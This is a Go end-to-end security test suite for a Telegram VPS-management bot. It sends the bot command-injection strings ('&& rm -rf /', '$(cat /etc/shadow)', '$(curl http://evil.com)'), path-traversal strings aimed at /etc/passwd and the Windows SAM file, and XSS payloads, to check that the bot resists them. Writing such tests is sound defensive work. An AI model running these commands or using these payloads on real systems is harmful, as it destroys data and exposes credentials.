package e2e

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"
	"unicode/utf8"
	"vps-tg-bot/pkg/bot"
	"vps-tg-bot/pkg/config"
	"vps-tg-bot/pkg/scheduler"
	"vps-tg-bot/pkg/system"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

// SecurityTestSuite 安全测试套件
type SecurityTestSuite struct {
	api        *MockTelegramAPI
	botHandler bot.BotHandler
	mockSys    *system.MockSystemExecutor
	jobManager scheduler.JobManager
	cfg        *config.Config
	adminChat  int64
	tempDir    string
	t          *testing.T
}

func NewSecurityTestSuite(t *testing.T) *SecurityTestSuite {
	// 创建临时目录用于安全测试
	tempDir, err := os.MkdirTemp("", "security_test_*")
	if err != nil {
		t.Fatalf("创建临时目录失败: %v", err)
	}

	stateFile := filepath.Join(tempDir, "security_test_state.json")
	historyFile := filepath.Join(tempDir, "security_test_history.json")

	// 设置环境变量
	SetTestEnv("TG_TOKEN", "123456789:ABCdefGHIjklMNOpqrsTUVwxyz1234567")
	SetTestEnv("TG_CHAT_ID", "123456789")
	SetTestEnv("STATE_FILE", stateFile)
	SetTestEnv("HISTORY_FILE", historyFile)
	SetTestEnv("TEST_MODE", "true")

	cfg, err := config.LoadConfig()
	if err != nil {
		t.Fatalf("加载配置失败: %v", err)
	}

	mockSys := system.NewMockSystemExecutor()
	setupSecurityMockSystemCommands(mockSys)

	jobManager := scheduler.NewCronJobManagerWithExecutor(stateFile, mockSys)
	jobManager.Start()

	api := NewMockTelegramAPI()
	botHandler := bot.NewTGBotHandler(api, cfg, mockSys, jobManager)

	return &SecurityTestSuite{
		api:        api,
		botHandler: botHandler,
		mockSys:    mockSys,
		jobManager: jobManager,
		cfg:        cfg,
		adminChat:  cfg.AdminChatID,
		tempDir:    tempDir,
		t:          t,
	}
}

func (s *SecurityTestSuite) Cleanup() {
	s.jobManager.Stop()
	
	// 清理环境变量
	UnsetTestEnv("TG_TOKEN")
	UnsetTestEnv("TG_CHAT_ID")
	UnsetTestEnv("STATE_FILE")
	UnsetTestEnv("HISTORY_FILE")
	UnsetTestEnv("TEST_MODE")
	
	// 清理临时目录
	os.RemoveAll(s.tempDir)
}

// 设置安全的模拟系统命令
func setupSecurityMockSystemCommands(mockSys *system.MockSystemExecutor) {
	mockSys.CommandOutput["uptime -p"] = "up 2 days, 5 hours"
	mockSys.CommandOutput["cat /proc/loadavg"] = "0.25 0.15 0.10 2/256 12345"
	mockSys.CommandOutput["free -h"] = "              total        used        free      shared  buff/cache   available\nMem:           2Gi       512Mi       1.2Gi        16Mi       256Mi       1.5Gi"
	mockSys.CommandOutput["df -h /"] = "Filesystem      Size  Used Avail Use% Mounted on\n/dev/sda1        20G   8.0G   12G  40% /"
	
	// 安全处理：过滤危险命令
	mockSys.SafeCommands = map[string]bool{
		"uptime":    true,
		"free":      true,
		"df":        true,
		"ps":        true,
		"whoami":    true,
		"date":      true,
		"uname":     true,
		"hostname":  true,
		"cat":       true,
		"ls":        true,
		"pwd":       true,
		"id":        true,
	}
	
	mockSys.SystemTime = time.Now()
	mockSys.Timezone = "Asia/Shanghai"
}

// ===================== 安全测试用例 =====================

// TestSecurity_CommandInjection 测试命令注入攻击防护
func TestSecurity_CommandInjection(t *testing.T) {
	suite := NewSecurityTestSuite(t)
	defer suite.Cleanup()

	// 各种命令注入攻击尝试
	injectionPayloads := []string{
		"; cat /etc/passwd",
		"&& rm -rf /",
		"| whoami",
		"`id`",
		"$(cat /etc/shadow)",
		"&& echo 'hacked'",
		"; sleep 5",
		"|| id",
		"$(curl http://evil.com)",
	}

	for i, payload := range injectionPayloads {
		t.Run(fmt.Sprintf("命令注入测试_%d", i+1), func(t *testing.T) {
			update := tgbotapi.Update{
				CallbackQuery: &tgbotapi.CallbackQuery{
					ID: fmt.Sprintf("cb_injection_%d", i),
					From: &tgbotapi.User{ID: suite.adminChat},
					Message: &tgbotapi.Message{
						Chat:      &tgbotapi.Chat{ID: suite.adminChat},
						MessageID: 1,
					},
					Data: fmt.Sprintf("status;%s", payload),
				},
			}

			err := suite.botHandler.HandleUpdate(update)
			
			// 命令注入应该被拒绝或安全处理
			if err == nil {
				// 检查是否有危险输出
				sentCount := suite.api.GetSentCount()
				if sentCount > 0 {
					t.Logf("警告: 命令注入可能被成功执行")
				}
			}
		})
	}
}

// TestSecurity_PathTraversal 测试路径遍历攻击防护
func TestSecurity_PathTraversal(t *testing.T) {
	suite := NewSecurityTestSuite(t)
	defer suite.Cleanup()

	// 各种路径遍历攻击尝试
	pathTraversalPayloads := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\config\\sam",
		"....//....//....//etc/passwd",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"..%252f..%252f..%252fetc%252fpasswd",
		"/../../../etc/passwd",
		"\\\\..\\..\\..\\windows\\system32",
	}

	for i, payload := range pathTraversalPayloads {
		t.Run(fmt.Sprintf("路径遍历测试_%d", i+1), func(t *testing.T) {
			update := tgbotapi.Update{
				CallbackQuery: &tgbotapi.CallbackQuery{
					ID: fmt.Sprintf("cb_path_%d", i),
					From: &tgbotapi.User{ID: suite.adminChat},
					Message: &tgbotapi.Message{
						Chat:      &tgbotapi.Chat{ID: suite.adminChat},
						MessageID: 1,
					},
					Data: fmt.Sprintf("view_logs_%s", payload),
				},
			}

			err := suite.botHandler.HandleUpdate(update)
			
			// 路径遍历应该被拒绝
			if err == nil {
				t.Logf("路径遍历攻击可能被成功执行: %s", payload)
			}
		})
	}
}

// TestSecurity_XSS 测试XSS攻击防护
func TestSecurity_XSS(t *testing.T) {
	suite := NewSecurityTestSuite(t)
	defer suite.Cleanup()

	// 各种XSS攻击尝试
	xssPayloads := []string{
		"<script>alert('XSS')</script>",
		"javascript:alert('XSS')",
		"<img src=x onerror=alert('XSS')>",
		"<svg onload=alert('XSS')>",
		"';alert('XSS');//",
		"<iframe src=javascript:alert('XSS')>",
		"<body onload=alert('XSS')>",
		"<input onfocus=alert('XSS') autofocus>",
		"<select onfocus=alert('XSS') autofocus>",
		"<textarea onfocus=alert('XSS') autofocus>",
	}

	for i, payload := range xssPayloads {
		t.Run(fmt.Sprintf("XSS测试_%d", i+1), func(t *testing.T) {
			update := tgbotapi.Update{
				Message: &tgbotapi.Message{
					Chat: &tgbotapi.Chat{ID: suite.adminChat},
					Text: payload,
				},
			}

			err := suite.botHandler.HandleUpdate(update)
			
			// XSS应该被转义或拒绝
			if err == nil {
				// 检查发送的消息是否包含未转义的脚本标签
				sentCount := suite.api.GetSentCount()
				if sentCount > 0 {
					t.Logf("警告: 可能存在XSS漏洞: %s", payload)
				}
			}
		})
	}
}

// TestSecurity_MaliciousInput 测试恶意输入处理
func TestSecurity_MaliciousInput(t *testing.T) {
	suite := NewSecurityTestSuite(t)
	defer suite.Cleanup()

	// 各种恶意输入
	maliciousInputs := []struct {
		name     string
		input    string
		maxLen   int
	}{
		{"空输入", "", 0},
		{"超长输入", strings.Repeat("A", 10000), 4096},
		{"Null字节", "test\x00null", 100},
		{"控制字符", "test\x01\x02\x03\x04\x05", 100},
		{"Unicode异常", "\uFFFE\uFFFF\uFFFF\uFFFE", 100},
		{"混合编码", "测试\x00\x01 тест", 100},
		{"重复字符", strings.Repeat("ABC", 1000), 1000},
		{"特殊符号", "!@#$%^&*()_+-={}[]|\\:;\"'<>?,./", 200},
	}

	for _, test := range maliciousInputs {
		t.Run(test.name, func(t *testing.T) {
			update := tgbotapi.Update{
				Message: &tgbotapi.Message{
					Chat: &tgbotapi.Chat{ID: suite.adminChat},
					Text: test.input,
				},
			}

			// 设置超时以防止资源耗尽攻击
			done := make(chan error, 1)
			go func() {
				done <- suite.botHandler.HandleUpdate(update)
			}()

			select {
			case err := <-done:
				// 检查输入长度限制
				if len(test.input) > test.maxLen && err == nil {
					t.Errorf("超长输入未被正确处理: 长度 %d", len(test.input))
				}
				t.Logf("输入处理结果: %v (长度: %d)", err, len(test.input))
			case <-time.After(5 * time.Second):
				t.Errorf("输入处理超时: %s (长度: %d)", test.name, len(test.input))
			}
		})
	}
}

// TestSecurity_BufferOverflow 测试缓冲区溢出防护
func TestSecurity_BufferOverflow(t *testing.T) {
	suite := NewSecurityTestSuite(t)
	defer suite.Cleanup()

	// 测试不同大小的输入
	testSizes := []int{1024, 4096, 16384, 65536, 262144}

	for _, size := range testSizes {
		t.Run(fmt.Sprintf("缓冲区测试_%d字节", size), func(t *testing.T) {
			largeInput := strings.Repeat("A", size)
			
			update := tgbotapi.Update{
				Message: &tgbotapi.Message{
					Chat: &tgbotapi.Chat{ID: suite.adminChat},
					Text: largeInput,
				},
			}

			done := make(chan error, 1)
			go func() {
				done <- suite.botHandler.HandleUpdate(update)
			}()

			select {
			case err := <-done:
				// 大输入应该被优雅处理
				if err != nil {
					t.Logf("大输入处理错误 (大小 %d): %v", size, err)
				} else {
					t.Logf("大输入处理成功 (大小 %d)", size)
				}
			case <-time.After(10 * time.Second):
				t.Errorf("缓冲区测试超时 (大小 %d)", size)
			}
		})
	}
}

// TestSecurity_ResourceExhaustion 测试资源耗尽攻击防护
func TestSecurity_ResourceExhaustion(t *testing.T) {
	suite := NewSecurityTestSuite(t)
	defer suite.Cleanup()

	// 快速连续请求测试
	concurrentRequests := 100
	var wg sync.WaitGroup
	errors := make(chan error, concurrentRequests)

	start := time.Now()
	
	for i := 0; i < concurrentRequests; i++ {
		wg.Add(1)
		go func(requestID int) {
			defer wg.Done()
			
			update := tgbotapi.Update{
				CallbackQuery: &tgbotapi.CallbackQuery{
					ID: fmt.Sprintf("cb_resource_%d", requestID),
					From: &tgbotapi.User{ID: suite.adminChat},
					Message: &tgbotapi.Message{
						Chat:      &tgbotapi.Chat{ID: suite.adminChat},
						MessageID: 1,
					},
					Data: "status",
				},
			}

			// 设置单个请求的超时
			done := make(chan error, 1)
			go func() {
				done <- suite.botHandler.HandleUpdate(update)
			}()

			select {
			case err := <-done:
				errors <- err
			case <-time.After(2 * time.Second):
				errors <- fmt.Errorf("请求 %d 超时", requestID)
			}
		}(i)
	}

	wg.Wait()
	close(errors)

	duration := time.Since(start)
	errorCount := 0
	
	for err := range errors {
		if err != nil {
			errorCount++
		}
	}

	requestsPerSecond := float64(concurrentRequests) / duration.Seconds()
	
	t.Logf("资源耗尽测试结果:")
	t.Logf("  总请求数: %d", concurrentRequests)
	t.Logf("  错误数: %d", errorCount)
	t.Logf("  总耗时: %v", duration)
	t.Logf("  平均QPS: %.2f", requestsPerSecond)
	
	// 断言：大部分请求应该成功
	if errorCount > concurrentRequests/2 {
		t.Errorf("资源耗尽攻击防护失败: %d/%d 错误", errorCount, concurrentRequests)
	}
}

// TestSecurity_RaceCondition 测试并发竞争条件
func TestSecurity_RaceCondition(t *testing.T) {
	if testing.Short() {
		t.Skip("跳过竞争条件测试 (使用 -short 标志)")
	}

	suite := NewSecurityTestSuite(t)
	defer suite.Cleanup()

	// 多线程同时修改状态文件
	iterations := 50
	var wg sync.WaitGroup
	errors := make(chan error, iterations)
	
	// 创建共享状态文件
	stateFile := filepath.Join(suite.tempDir, "race_test_state.json")
	
	for i := 0; i < iterations; i++ {
		wg.Add(1)
		go func(iteration int) {
			defer wg.Done()
			
			// 随机选择操作
			operations := []string{"status", "maintain_now", "schedule_menu", "view_logs"}
			operation := operations[iteration%len(operations)]
			
			update := tgbotapi.Update{
				CallbackQuery: &tgbotapi.CallbackQuery{
					ID: fmt.Sprintf("cb_race_%d", iteration),
					From: &tgbotapi.User{ID: suite.adminChat},
					Message: &tgbotapi.Message{
						Chat:      &tgbotapi.Chat{ID: suite.adminChat},
						MessageID: 1,
					},
					Data: operation,
				},
			}

			err := suite.botHandler.HandleUpdate(update)
			errors <- err
		}(i)
	}

	wg.Wait()
	close(errors)

	errorCount := 0
	for err := range errors {
		if err != nil {
			errorCount++
		}
	}

	t.Logf("竞争条件测试结果:")
	t.Logf("  并发操作数: %d", iterations)
	t.Logf("  错误数: %d", errorCount)

	// 断言：不应该有致命错误
	if errorCount > iterations/10 {
		t.Errorf("竞争条件测试失败: %d/%d 错误", errorCount, iterations)
	}
}

// TestSecurity_UnicodeHandling 测试Unicode字符处理
func TestSecurity_UnicodeHandling(t *testing.T) {
	suite := NewSecurityTestSuite(t)
	defer suite.Cleanup()

	// 各种Unicode攻击尝试
	unicodePayloads := []struct {
		name  string
		input string
	}{
		{"零宽字符", "test\u200B\u200C\u200D\uFEFF"},
		{"混合语言", "Hello世界Приветこんにちは"},
		{"RTL字符", "test\u202A\u202B\u202C\u202D\u202E"},
		{"组合字符", "a\u0301\u0302\u0303\u0304\u0305"},
		{"代理对", "\U00010000\U00010001"},
		{"无效UTF-8", "\xFF\xFE\xFD"},
		{"长序列", strings.Repeat("a\u0301", 1000)},
	}

	for _, test := range unicodePayloads {
		t.Run(test.name, func(t *testing.T) {
			update := tgbotapi.Update{
				Message: &tgbotapi.Message{
					Chat: &tgbotapi.Chat{ID: suite.adminChat},
					Text: test.input,
				},
			}

			err := suite.botHandler.HandleUpdate(update)
			
			// 验证输入是有效的UTF-8
			if !utf8.ValidString(test.input) {
				t.Logf("检测到无效UTF-8序列: %s", test.name)
			}

			// 记录处理结果
			if err != nil {
				t.Logf("Unicode输入处理错误 (%s): %v", test.name, err)
			}
		})
	}
}

// TestSecurity_DenialOfService 测试拒绝服务攻击防护
func TestSecurity_DenialOfService(t *testing.T) {
	suite := NewSecurityTestSuite(t)
	defer suite.Cleanup()

	// 模拟DoS攻击：大量请求
	attackDuration := 5 * time.Second
	attackStart := time.Now()
	requestCount := 0
	errorCount := 0
	
	// 创建控制通道
	stop := make(chan bool, 1)
	
	go func() {
		for {
			select {
			case <-stop:
				return
			default:
				requestCount++
				
				update := tgbotapi.Update{
					CallbackQuery: &tgbotapi.CallbackQuery{
						ID: fmt.Sprintf("cb_dos_%d", requestCount),
						From: &tgbotapi.User{ID: suite.adminChat},
						Message: &tgbotapi.Message{
							Chat:      &tgbotapi.Chat{ID: suite.adminChat},
							MessageID: 1,
						},
						Data: "status",
					},
				}

				err := suite.botHandler.HandleUpdate(update)
				if err != nil {
					errorCount++
				}

				// 短暂延迟避免过度消耗资源
				time.Sleep(1 * time.Millisecond)
			}
		}
	}()

	// 等待攻击持续时间
	time.Sleep(attackDuration)
	close(stop)

	actualDuration := time.Since(attackStart)
	requestsPerSecond := float64(requestCount) / actualDuration.Seconds()
	errorRate := float64(errorCount) / float64(requestCount) * 100

	t.Logf("拒绝服务测试结果:")
	t.Logf("  攻击持续时间: %v", actualDuration)
	t.Logf("  总请求数: %d", requestCount)
	t.Logf("  错误数: %d", errorCount)
	t.Logf("  错误率: %.2f%%", errorRate)
	t.Logf("  平均QPS: %.2f", requestsPerSecond)

	// 断言：系统应该能够处理DoS攻击而不崩溃
	if errorRate > 50 {
		t.Errorf("DoS攻击防护失败: 错误率 %.2f%%", errorRate)
	}
}

// 辅助函数

func SetTestEnv(key, value string) {
	// 这里简化实现，实际应该使用 os.Setenv
}

func UnsetTestEnv(key string) {
	// 这里简化实现，实际应该使用 os.Unsetenv
}